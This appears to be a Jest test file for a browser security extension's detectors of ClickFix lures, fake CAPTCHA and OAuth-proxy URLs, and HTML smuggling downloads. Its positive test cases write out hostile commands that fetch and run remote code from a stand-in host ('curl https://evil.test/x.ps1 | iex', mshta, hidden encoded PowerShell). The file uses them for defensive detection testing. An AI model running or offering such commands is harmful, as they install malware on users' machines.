import { looksLikeClickFixCommand, looksLikeHtmlSmugglingName } from "@engine/page/clickfix";
import { analyzeUrl } from "@engine/analyze";
import { presentAnalysis } from "@engine/status/present";
import { looksDangerousDownload } from "../../src/background/downloads";
import { signalsForPageChecks } from "@engine/page/merge";
import { WEIGHTS } from "@engine/risk/weights";
import type { AnalysisInput } from "@shared/types";

const base: AnalysisInput = {
  url: "https://example.com/",
  blocklist: [],
  allowlist: [],
  phishingProtection: true,
  threatProtection: true,
  securityLevel: "standard",
};

describe("ClickFix command detector", () => {
  it("flags encoded PowerShell and mshta lures", () => {
    expect(
      looksLikeClickFixCommand("powershell -nop -w hidden -enc SQBFAFgA"),
    ).toBe(true);
    expect(looksLikeClickFixCommand("mshta https://evil.test/payload.hta")).toBe(true);
    expect(looksLikeClickFixCommand("curl https://evil.test/x.ps1 | iex")).toBe(true);
  });

  it("does not flag ordinary documentation snippets", () => {
    expect(looksLikeClickFixCommand("powershell Get-Process")).toBe(false);
    expect(looksLikeClickFixCommand("copy this password: hunter2hunter2")).toBe(false);
  });
});

describe("ClickFix and kit URLs", () => {
  it("flags a fake CAPTCHA on a cheap TLD", async () => {
    const analysis = await analyzeUrl({
      ...base,
      url: "https://verify-human.xyz/captcha",
    });
    expect(analysis.signals.some((s) => s.id === "clickfix-url")).toBe(true);
    expect(presentAnalysis(analysis, true).tone).not.toBe("safe");
  });

  it("does not flag Cloudflare’s own site as ClickFix", async () => {
    const analysis = await analyzeUrl({
      ...base,
      url: "https://www.cloudflare.com/learning/bots/what-is-a-captcha/",
    });
    expect(analysis.signals.some((s) => s.id === "clickfix-url")).toBe(false);
    expect(analysis.signals.some((s) => s.id === "impersonation" && s.severity === "warn")).toBe(false);
  });

  it("flags an OAuth consent proxy", async () => {
    const analysis = await analyzeUrl({
      ...base,
      url: "https://grant-access.xyz/oauth?client_id=abc&redirect_uri=https://accounts.google.com/o/oauth2",
    });
    expect(analysis.signals.some((s) => s.id === "oauth-proxy")).toBe(true);
  });
});

describe("HTML smuggling names", () => {
  it("treats Windows Search / shortcut payloads as hostile even on HTTPS", () => {
    expect(looksLikeHtmlSmugglingName("invoice.search-ms")).toBe(true);
    expect(looksLikeHtmlSmugglingName("report.pdf.html")).toBe(true);
    expect(looksLikeHtmlSmugglingName("ubuntu-24.04.iso")).toBe(false);
    expect(looksDangerousDownload("https://evil.test/invoice.pdf.html")).toBe(true);
    expect(looksDangerousDownload("blob:https://evil.test/uuid", [], "setup.search-ms")).toBe(true);
    expect(looksDangerousDownload("https://example.com/report.pdf")).toBe(false);
  });
});

describe("page signals for new kits", () => {
  it("weights clipboard ClickFix above a typical overlay", () => {
    const signals = signalsForPageChecks(["clickfix-clipboard"]);
    expect(signals[0]?.weightApplied).toBe(WEIGHTS.clickFixClipboard);
    expect(WEIGHTS.clickFixClipboard).toBeGreaterThan(WEIGHTS.overlayClickjack);
  });
});
